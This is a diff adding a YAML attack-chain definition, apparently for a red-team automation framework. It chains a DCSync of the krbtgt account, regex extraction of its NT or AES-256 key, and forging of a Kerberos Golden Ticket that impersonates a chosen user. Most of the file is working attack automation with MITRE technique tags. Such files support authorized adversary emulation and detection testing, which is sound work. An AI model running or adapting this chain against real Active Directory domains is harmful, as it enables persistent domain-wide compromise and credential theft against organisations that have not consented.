@@ -1,0 +1,85 @@
+---
+api_version: 2.0
+uuid: b1f3d7e5-4c8a-9b2d-e6f0-3a5c1d8e7f9b
+name: DCSync krbtgt and Forge Golden Ticket
+authors:
+  - isaac_fletcher
+description: |
+  This chain TTP performs an end-to-end Golden Ticket attack by first extracting the
+  krbtgt account hash via DCSync, then using it to forge a Golden Ticket.
+
+  The attack chain:
+  1. Credential Access: DCSync the krbtgt account to extract its NT hash
+  2. Discovery: Look up the domain SID via lookupsid.py
+  3. Credential Access: Forge a Golden Ticket using the extracted krbtgt hash
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1003 OS Credential Dumping
+    - T1558 Steal or Forge Kerberos Tickets
+  subtechniques:
+    - T1003.006 DCSync
+    - T1558.001 Golden Ticket
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: ticket_user
+    description: The username to impersonate in the golden ticket
+  - name: ticket_type
+    description: |
+      The type of key to use for forging the ticket.
+      - rc4: Use the NT hash (default)
+      - aes: Use the AES-256 key
+    choices:
+      - rc4
+      - aes
+    default: rc4
+steps:
+  - name: dcsync_krbtgt
+    description: DCSync the krbtgt account to extract its NT hash
+    ttp: //credential-access/dcsync-user/ttp.yaml
+    args:
+      domain: "{{ .Args.domain }}"
+      dc: "{{ .Args.dc }}"
+      username: "{{ .Args.username }}"
+      password: "{{ .Args.password }}"
+      target_user: "krbtgt"
+
+  - name: extract_krbtgt_hash
+    description: Parse the krbtgt key from the DCSync output
+    inline: |
+      {{if eq .Args.ticket_type "aes"}}
+      cat <<'DCSYNC_EOF' | grep -oP '(^|\\)krbtgt:aes256-cts-hmac-sha1-96:\K[a-f0-9]+'
+      {[{.StepVars.DCSYNC_OUTPUT}]}
+      DCSYNC_EOF
+      {{else}}
+      cat <<'DCSYNC_EOF' | grep -oP '(^|\\)krbtgt:\d+:[a-f0-9]+:\K[a-f0-9]+(?=:::)'
+      {[{.StepVars.DCSYNC_OUTPUT}]}
+      DCSYNC_EOF
+      {{end}}
+    outputvar: KRBTGT_HASH
+
+  - name: forge_golden_ticket
+    description: Forge a Golden Ticket using the extracted krbtgt hash
+    ttp: //credential-access/forge-golden-ticket/ttp.yaml
+    args:
+      domain: "{{ .Args.domain }}"
+      dc: "{{ .Args.dc }}"
+      username: "{{ .Args.username }}"
+      password: "{{ .Args.password }}"
+      ticket_type: "{{ .Args.ticket_type }}"
+      krbtgt_key: "{[{.StepVars.KRBTGT_HASH}]}"
+      ticket_user: "{{ .Args.ticket_user }}"
